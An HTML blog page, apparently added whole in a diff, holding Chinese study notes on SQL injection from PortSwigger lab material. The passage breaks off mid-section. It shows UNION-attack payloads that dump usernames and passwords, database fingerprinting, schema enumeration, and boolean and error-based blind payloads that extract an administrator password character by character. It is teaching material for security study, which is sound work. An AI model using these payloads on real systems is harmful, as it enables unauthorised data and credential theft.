@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="记录学习和题解">
+<title>Burp靶场：SQL注入</title>
+
+<link rel='canonical' href='https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/'>
+
+<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="Burp靶场：SQL注入">
+<meta property='og:description' content="记录学习和题解">
+<meta property='og:url' content='https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/'>
+<meta property='og:site_name' content='Calendar&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='Burp靶场' /><meta property='article:published_time' content='2025-11-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-21T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Burp靶场：SQL注入">
+<meta name="twitter:description" content="记录学习和题解"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/index.json">
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/calendar0917/images/master/20251021223022235.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/images/1_hu_b5fde55a1ef6fadd.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Calendar&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/calendar0917'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#707070"
+     stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+     class="icon icon-tabler icons-tabler-outline icon-tabler-square-rounded-arrow-up">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+    <path d="M16 12l-4 -4l-4 4"/>
+    <path d="M12 16v-8"/>
+    <path d="M12 3c7.2 0 9 1.8 9 9s-1.8 9 -9 9s-9 -1.8 -9 -9s1.8 -9 9 -9z"/>
+</svg>
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#知识">知识</a>
+      <ol>
+        <li><a href="#注入点">注入点</a></li>
+        <li><a href="#union-攻击">UNION 攻击</a>
+          <ol>
+            <li><a href="#判断列数">判断列数</a></li>
+            <li><a href="#寻找数据类型可用的列">寻找数据类型可用的列</a></li>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+          </ol>
+        </li>
+        <li><a href="#不同数据库的差异">不同数据库的差异</a></li>
+        <li><a href="#数据库信息查询">数据库信息查询</a>
+          <ol>
+            <li><a href="#列出数据库中的内容">列出数据库中的内容</a></li>
+          </ol>
+        </li>
+        <li><a href="#盲注">盲注</a>
+          <ol>
+            <li><a href="#布尔">布尔</a></li>
+            <li><a href="#条件">条件</a></li>
+          </ol>
+        </li>
+        <li></li>
+        <li>
+          <ol>
+            <li><a href="#报错">报错</a></li>
+            <li><a href="#时间">时间</a></li>
+            <li><a href="#带外">带外</a></li>
+          </ol>
+        </li>
+        <li><a href="#其他环境下的-sql-注入">其他环境下的 SQL 注入</a></li>
+        <li><a href="#二阶注入">二阶注入</a></li>
+        <li><a href="#防范注入">防范注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#labs-题解">Labs 题解</a>
+      <ol>
+        <li><a href="#union-攻击-1">Union 攻击</a>
+          <ol>
+            <li><a href="#常规">常规</a></li>
+            <li><a href="#找可用列">找可用列</a></li>
+            <li><a href="#拼接字符串">拼接字符串</a></li>
+          </ol>
+        </li>
+        <li><a href="#数据库查询">数据库查询</a>
+          <ol>
+            <li><a href="#普通查询">普通查询</a></li>
+            <li><a href="#查表列名">查表、列名</a></li>
+          </ol>
+        </li>
+        <li><a href="#盲注-1">盲注</a>
+          <ol>
+            <li><a href="#布尔盲注">布尔盲注</a></li>
+            <li><a href="#条件盲注">条件盲注</a></li>
+            <li><a href="#报错信息泄露">报错信息泄露</a></li>
+            <li><a href="#时间盲注">时间盲注</a></li>
+            <li><a href="#带外盲注">带外盲注</a></li>
+          </ol>
+        </li>
+        <li><a href="#其他场景的注入">其他场景的注入</a>
+          <ol>
+            <li><a href="#xml-编码绕过-waf">XML 编码绕过 WAF</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #3654aa; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/">Burp靶场：SQL注入</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            记录学习和题解
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 21, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="知识">知识
+</h2><h3 id="注入点">注入点
+</h3><p>可以通过对应用程序的<strong>所有输入点</strong>执行一套系统化测试，手动检测 SQL 注入漏洞。通常需提交以下内容：</p>
+<ol>
+<li>单引号字符 <code>'</code>，观察是否出现错误或其他异常；</li>
+<li>特定 SQL 语法（其计算结果分别等于输入点的原始值和不同值），观察应用程序响应是否存在规律性差异；</li>
+<li>布尔条件（如 <code>OR 1=1</code>、<code>OR 1=2</code>），观察应用程序响应差异；</li>
+<li>用于在 SQL 查询执行时触发延时的负载，观察响应时间是否存在差异；</li>
+<li>用于在 SQL 查询执行时触发带外网络交互的 OAST（带外应用安全测试） 负载，并监控是否产生相关交互。</li>
+</ol>
+<p>此外，也可以使用 Burp Scanner 快速、可靠地发现绝大多数 SQL 注入漏洞。</p>
+<h3 id="union-攻击">UNION 攻击
+</h3><p>当应用程序存在SQL注入漏洞，且查询结果会返回到应用响应中时，可利用 <code>UNION</code> 关键字从数据库的<strong>其他表</strong>中获取数据。这种攻击方式通常被称为 <strong>SQL注入UNION攻击</strong>。</p>
+<p><code>UNION</code> 关键字允许执行一个或多个额外的 <code>SELECT</code> 查询，并将结果附加到原始查询中。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">c</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>该SQL查询会返回一个包含两列的结果集，数据涵盖 <code>table1</code> 表的 <code>a</code>、<code>b</code> 列和 <code>table2</code> 表的 <code>c</code>、<code>d</code> 列。</p>
+<p>要让 UNION 查询生效，必须满足两个关键条件：</p>
+<ol>
+<li>各个查询必须返回<strong>相同数量的列</strong>；</li>
+<li>各个查询对应列的数据类型必须<strong>兼容</strong>。</li>
+</ol>
+<p>实施 SQL 注入 UNION 攻击时，需确保攻击手段符合这两个条件。这通常需要查明以下两点：</p>
+<ol>
+<li>原始查询返回的列数是多少；</li>
+<li>原始查询返回的列中，哪些列的数据类型适合承载注入查询的结果。</li>
+</ol>
+<h4 id="判断列数">判断列数
+</h4><p>在实施SQL注入UNION攻击时，有两种有效方法可确定原始查询返回的列数。</p>
+<p>其中一种方法是注入一系列<code>ORDER BY</code>子句，并逐步增加指定的列索引，直至触发错误。例如，若注入点位于原始查询<code>WHERE</code>子句内的带引号字符串中，你需要提交以下负载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; ORDER BY 1--
+</span></span><span class="line"><span class="cl">&#39; ORDER BY 2--
+</span></span><span class="line"><span class="cl">&#39; ORDER BY 3--
+</span></span><span class="line"><span class="cl">……
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一系列负载会修改原始查询，使其按结果集中的不同列对结果排序。<code>ORDER BY</code>子句中的列可通过索引指定，因此无需知晓任何列名。当指定的列索引超过结果集中的实际列数时，数据库会返回错误，例如：</p>
+<blockquote>
+<p>ORDER BY位置编号3超出了选择列表中的项目数量。</p>
+</blockquote>
+<p>应用程序可能会在HTTP响应中直接返回数据库错误，也可能返回通用的错误响应，甚至可能仅返回空结果。无论哪种情况，只要能检测到<strong>响应中的差异</strong>，就能推断出查询返回的列数。</p>
+<p>第二种方法是提交一系列<code>UNION SELECT</code>负载，其中包含数量不同的空值（<code>NULL</code>）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; UNION SELECT NULL--
+</span></span><span class="line"><span class="cl">&#39; UNION SELECT NULL,NULL--
+</span></span><span class="line"><span class="cl">&#39; UNION SELECT NULL,NULL,NULL--
+</span></span><span class="line"><span class="cl">……
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若空值的数量与列数不匹配，数据库会返回错误。</p>
+<p>我们将注入的<code>SELECT</code>查询的返回值设为<code>NULL</code>，原因是原始查询与注入查询的对应列必须数据类型兼容。而<code>NULL</code>可<strong>转换为所有常见的数据类型</strong>，因此当列数正确时，能最大程度提高负载的执行成功率。</p>
+<h4 id="寻找数据类型可用的列">寻找数据类型可用的列
+</h4><p>SQL注入UNION攻击能让你获取注入查询的结果，而你想要提取的关键数据通常是以字符串形式存储的。这意味着，你需要在原始查询的结果中，找到一列或多列<strong>数据类型为字符串，或与字符串数据兼容</strong>的列。</p>
+<p>在确定所需的列数后，你可以逐个探测每一列，测试其是否能存储字符串数据。你需要提交一系列<code>UNION SELECT</code>负载，依次在每一列中放入一个字符串值。例如，若查询返回四列，你应提交以下负载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; UNION SELECT &#39;a&#39;,NULL,NULL,NULL--
+</span></span><span class="line"><span class="cl">&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL--
+</span></span><span class="line"><span class="cl">&#39; UNION SELECT NULL,NULL,&#39;a&#39;,NULL--
+</span></span><span class="line"><span class="cl">&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果目标列的数据类型与字符串不兼容，注入的查询会触发数据库错误。</p>
+<p>若未出现错误，且应用程序的响应中包含了额外内容（其中包含注入的字符串值），则说明该列适合用于提取字符串数据。</p>
+<h4 id="漏洞利用">漏洞利用
+</h4><p>当你确定了原始查询返回的列数，并找到可存储字符串数据的列后，就可以着手获取关键数据了。</p>
+<p>假设存在以下条件：</p>
+<ol>
+<li>原始查询返回两列，且这两列均支持存储字符串数据；</li>
+<li>注入点位于<code>WHERE</code>子句内的带引号字符串中；</li>
+<li>数据库中存在一个名为<code>users</code>的表，包含<code>username</code>（用户名）和<code>password</code>（密码）两列。</li>
+</ol>
+<p>在这个示例中，你可以提交如下输入，获取<code>users</code>表中的数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username, password FROM users--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>要实施此类攻击，你<strong>需要预先知晓</strong>数据库中存在<code>users</code>表，且该表包含<code>username</code>和<code>password</code>列。若缺乏这些信息，就需要猜测表名和列名。不过，所有现代数据库都提供了查看数据库结构的方法，可通过这些方法确定其中包含的表和列。</p>
+<h5 id="合并字符串">合并字符串
+</h5><p>有时候，不会所有列都返回或显示，这时候就需要将字符串合并起来，具体需要看是什么数据库。</p>
+<p>例如在 Oracle 数据库中，可提交如下输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username || &#39;</span><span class="o">~</span><span class="s1">&#39; || password FROM users--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里使用的双竖线<code>||</code>是 Oracle 的字符串拼接运算符。注入的查询会将<code>username</code>和<code>password</code>字段的值拼接在一起，并以<code>~</code>字符作为分隔。</p>
+<h3 id="不同数据库的差异">不同数据库的差异
+</h3><p>详见：<a class="link" href="https://portswigger.net/web-security/sql-injection/cheat-sheet"  target="_blank" rel="noopener"
+    >SQL injection cheat sheet | Web Security Academy</a></p>
+<p>对注释、查询等，不同的数据库会有不同的特定行为，需要根据需要更改。主要类型有：Oracle、Microsoft、PostgreSQL、MySQL</p>
+<h3 id="数据库信息查询">数据库信息查询
+</h3><p>通过注入不同数据库厂商专属的查询语句，根据语句是否执行成功，来确定数据库的<strong>类型</strong>和<strong>版本</strong>。</p>
+<p>以下是用于查询几款主流数据库版本的语句：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>数据库类型</th>
+          <th>查询语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>微软 SQL Server、MySQL</td>
+          <td>SELECT @@version</td>
+      </tr>
+      <tr>
+          <td>Oracle</td>
+          <td>SELECT * FROM v$version</td>
+      </tr>
+      <tr>
+          <td>PostgreSQL</td>
+          <td>SELECT version()</td>
+      </tr>
+  </tbody>
+</table></div>
+<h4 id="列出数据库中的内容">列出数据库中的内容
+</h4><p>多数数据库类型（Oracle 除外）都包含一组名为 <strong>信息模式（information schema</strong> 的视图，这组视图会提供数据库的相关元数据信息。</p>
+<blockquote>
+<p>Oracle 不使用<code>information_schema</code>，而是通过内置系统表（如<code>all_tables</code>查看表名、<code>all_tab_columns</code>查看列信息）来获取元数据。</p>
+</blockquote>
+<p>例如，你可以查询<code>information_schema.tables</code>来列出数据库中的所有表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>该查询会返回类似如下的结果：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>TABLE_CATALOG</th>
+          <th>TABLE_SCHEMA</th>
+          <th>TABLE_NAME</th>
+          <th>TABLE_TYPE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Products</td>
+          <td>BASE TABLE</td>
+      </tr>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Users</td>
+          <td>BASE TABLE</td>
+      </tr>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Feedback</td>
+          <td>BASE TABLE</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>上述结果表明数据库中有三张表，分别为<code>Products</code>、<code>Users</code>和<code>Feedback</code>。</p>
+<p>随后，你可以查询<code>information_schema.columns</code>来列出单个表中的列信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Users&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>该查询会返回类似如下的结果：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>TABLE_CATALOG</th>
+          <th>TABLE_SCHEMA</th>
+          <th>TABLE_NAME</th>
+          <th>COLUMN_NAME</th>
+          <th>DATA_TYPE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Users</td>
+          <td>UserId</td>
+          <td>int</td>
+      </tr>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Users</td>
+          <td>Username</td>
+          <td>varchar</td>
+      </tr>
+      <tr>
+          <td>MyDatabase</td>
+          <td>dbo</td>
+          <td>Users</td>
+          <td>Password</td>
+          <td>varchar</td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="盲注">盲注
+</h3><p>当应用程序存在 SQL 注入漏洞，但 HTTP 响应中<strong>不包含相关 SQL 查询的结果</strong>，也<strong>不显示任何数据库错误详情</strong>时，就会发生盲注。</p>
+<p>许多注入技术（如 UNION 攻击）在盲注漏洞中无法奏效，这是因为这些技术的核心依赖是能在应用响应中看到注入查询的执行结果。不过，攻击者仍可利用盲注获取未授权数据，只是需要使用不同的技术手段。</p>
+<h4 id="布尔">布尔
+</h4><p>什么技术手段呢？一个例子是，根据返回的内容进行判断，例如分别注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>观察返回的结果，如果两个例子返回的不同，就可以根据返回结果来判断查询是否是有效的，我们能做的就很多了。你可以通过发送一系列输入，<strong>逐字符测试密码</strong>，最终确定某项数据。</p>
+<p>操作步骤如下：</p>
+<ol>
+<li>
+<p>首先发送以下输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;m
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若返回成功，说明注入的条件为真，即密码的第一个字符大于 <code>m</code>。</p>
+</li>
+<li>
+<p>接着发送以下输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;t
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若未返回成功，说明注入的条件为假，即密码的第一个字符不大于 <code>t</code>。</p>
+</li>
+<li>
+<p>最终发送以下输入，若返回成功，则可确认密码的第一个字符为 <code>s</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) = &#39;s
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>重复上述过程，即可系统性地推断出 <code>Administrator</code> 用户的完整密码。</p>
+<blockquote>
+<p>SUBSTRING(查询的字符串，起始位置，截取几个字符)，在有些数据库里，又叫做 SUBSTR</p>
+</blockquote>
+<h4 id="条件">条件
+</h4><p>报错型 SQL 注入指的是：即便在盲注场景下，你仍可利用数据库返回的<strong>错误信息</strong>，直接提取或推断数据库中的敏感数据。与布尔盲注的差别主要是,报错盲注会返回具体的<strong>报错信息</strong>可供利用，或者只检查语句本身是否合法，而不检查语句是否为真。</p>
+<p>要理解这种技术的工作方式，假设依次发送两个请求，请求中包含的<code>TrackingId</code> Cookie值分别为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xyz&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a
+</span></span><span class="line"><span class="cl">xyz&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这些输入利用<code>CASE</code>关键字测试条件，并根据条件是否成立返回不同的表达式，具体逻辑如下：</p>
+<ul>
+<li>第一个输入中，<code>CASE</code>表达式的结果为<code>'a'</code>，不会触发任何数据库错误；</li>
+<li>第二个输入中，<code>CASE</code>表达式的结果为<code>1/0</code>（零除运算），会触发<strong>除零错误</strong>。</li>
+</ul>
+<p>如果该错误会导致应用的HTTP响应产生可识别的差异（如返回500错误页、弹出提示信息），你就可以借此判断注入的条件是否成立。</p>
+<p>借助这种技术，你可以通过<strong>逐字符测试</strong>的方式提取数据库中的数据，例如：</p>
+<div class="highlight"><div class="chroma">
